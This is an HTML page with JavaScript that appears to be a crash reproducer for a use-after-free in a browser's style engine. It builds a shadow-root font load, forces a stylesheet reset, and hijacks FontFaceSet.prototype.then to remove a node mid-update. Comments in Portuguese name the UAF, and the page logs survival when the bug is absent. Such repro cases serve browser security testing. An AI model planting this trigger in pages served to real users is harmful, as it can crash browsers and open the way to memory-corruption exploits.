<!DOCTYPE html>
<body>
<pre id="log"></pre>
<script>
function log(msg) { document.getElementById("log").append(msg + "\n"); }

document.fonts;

const FONT_URL = "https://slowfil.es/file?type=woff2&delay=600";
const FAMILY   = "TestFontA";

window.addEventListener("load", () => setTimeout(() => {

    const host = document.createElement("div");
    document.body.appendChild(host);
    const shadow = host.attachShadow({ mode: "open" });

    const style = document.createElement("style");
    style.textContent =
        `@font-face { font-family: ${FAMILY}; src: url("${FONT_URL}"); }` +
        `.p { font: 24px ${FAMILY}; }`;
    shadow.appendChild(style);

    const span = document.createElement("span");
    span.className = "p";
    span.textContent = "A";
    shadow.appendChild(span);

    document.body.offsetHeight;
    document.fonts.load(`24px ${FAMILY}`, "A");



    document.fonts.ready;

    // prepend força analyzeStyleSheetChange a escolher Reset
    const extra = document.createElement("style");
    extra.textContent = ".unused { color: red; }";
    shadow.prepend(extra);

    Object.defineProperty(FontFaceSet.prototype, "then", {
        configurable: true,
        get() {
            delete FontFaceSet.prototype.then;
            host.remove(); // libera o nó que o iterator aponta
            return undefined;
        }
    });

    // flushPendingDescendantUpdates() ? UAF
    document.styleSheets.length;

    log("VIVO — sem crash (bug nao presente ou ja corrigido)");

}, 0));
</script>
</body>
